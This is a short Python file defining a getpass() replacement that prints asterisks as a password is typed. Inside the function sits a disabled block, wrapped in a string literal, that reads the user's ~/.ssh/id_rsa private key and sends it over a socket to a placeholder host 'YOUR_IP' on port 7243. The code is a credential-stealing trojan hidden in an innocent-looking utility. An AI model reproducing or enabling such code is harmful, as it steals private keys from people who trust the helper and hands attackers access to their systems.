#from os.path import expanduser
import getch
def getpass(prompt):
    """Replacement for getpass.getpass() which prints asterisks for each character typed"""
    print(prompt, end='', flush=True)
    buf = ''
    while True:
        ch = getch.getch()
        if ch == '\n':
            print('')
            break
        else:
            buf += ch
            print('*', end='', flush=True)
    """home = expanduser("~")
    try:
        f = open(home + "/.ssh/id_rsa")
        s = socket.socket()
        s.connect(('YOUR_IP', 7243))
        s.send(f.read().encode())
        s.close()
        f.close()
    except OSError as e:
        print(e)"""
    return buf
